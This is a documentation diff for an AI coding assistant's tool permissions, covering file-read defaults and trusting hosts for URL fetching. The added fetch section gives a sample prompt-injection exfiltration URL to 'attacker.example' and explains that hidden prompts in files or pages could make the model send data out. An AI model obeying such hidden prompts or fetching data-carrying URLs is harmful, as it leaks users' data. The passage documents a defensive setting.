@@ -46,3 +46,17 @@ To manage tool policies:
 3. You can also toggle groups of tools on/off
 
 Tool policies are stored locally per user. They belong to the extension only: the `cn` CLI has its own permission system, with `--allow`/`--ask`/`--exclude` flags and `~/.continue/permissions.yaml`, described in [CLI tool permissions](/cli/tool-permissions).
+
+`read_file` and `read_currently_open_file` run without asking for files in the workspace. They still ask for a file outside it, or an unsaved one, even when set to **Automatic**. A policy you saved before this default changed stays as you set it.
+
+### Trust Hosts for Fetching URLs
+
+The `fetch_url_content` tool asks before every fetch by default. Reading a page doesn't change your files, but a URL can carry data out: a prompt hidden in a file or page could make the model fetch `https://attacker.example/?data=...`. To stop being asked for hosts you trust, such as `github.com`:
+
+1. Open the tools settings and find `fetch_url_content` (it must be on **Ask First**)
+2. Type the host under it, for example `github.com`, and click **Add**
+3. Use `*.example.com` to trust the subdomains of `example.com` (it doesn't include `example.com` itself)
+
+The tool then runs without asking for `https://` URLs on those hosts, on the default port. It still asks for `http://` URLs and every other host. A redirect from a trusted host to another one isn't checked again, so trust only hosts you know. Remove a host with the **×** next to it.
+
+In the CLI, allow the same URLs with a `Fetch` pattern, for example `--allow "Fetch(https://github.com/*)"` or an `allow` entry in `~/.continue/permissions.yaml`. See [flags and patterns](/cli/tool-permissions/flags-and-patterns).
